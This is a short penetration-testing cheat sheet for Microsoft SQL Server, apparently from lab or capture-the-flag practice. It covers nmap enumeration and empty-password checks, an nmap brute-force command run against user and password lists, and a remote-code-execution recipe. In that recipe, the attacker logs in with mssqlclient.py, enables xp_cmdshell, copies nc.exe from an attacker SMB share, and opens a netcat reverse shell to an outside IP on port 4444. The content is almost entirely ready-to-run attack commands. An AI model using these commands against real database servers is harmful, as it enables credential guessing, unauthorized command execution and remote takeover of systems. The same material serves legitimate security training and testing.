## Quick Intro
**Microsoft SQL Server** is a [relational database management system](https://en.wikipedia.org/wiki/Relational_database_management_system) developed by [Microsoft](https://en.wikipedia.org/wiki/Microsoft). As a [database server](https://en.wikipedia.org/wiki/Database_server), it is a [software product](https://en.wikipedia.org/wiki/Software_product) with the primary function of storing and retrieving data as requested by other [software applications](https://en.wikipedia.org/wiki/Software_application)—which may run either on the same computer or on another computer across a network (including the Internet).

## Nmap Scripts

```
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
```

## Brute Force

```
nmap -n -v -sV -Pn -p 1433 –script ms-sql-brute –script-args userdb=users.txt,passdb=passwords.txt $ip
```

## RCE with SQL Server

- We can use `mssql.py` to login and execute the commands

```
mssqlclient.py <domain>/<username>:<password>@$ip

mssqlclient.py bathry/admin:pss123@192.168.11.15
```

- Enabled Code execution
    
- Copied the Nishang reverse shell to current directory and added localhost and port to it and start hosting server

```
SQL> enable_xp_cmdshell

SQL> xp_cmdshell copy \\10.10.16.26\gabbar\nc.exe %temp%\nc.exe

SQL> xp_cmdshell %temp%/nc.exe -e cmd.exe 10.10.16.26 4444
```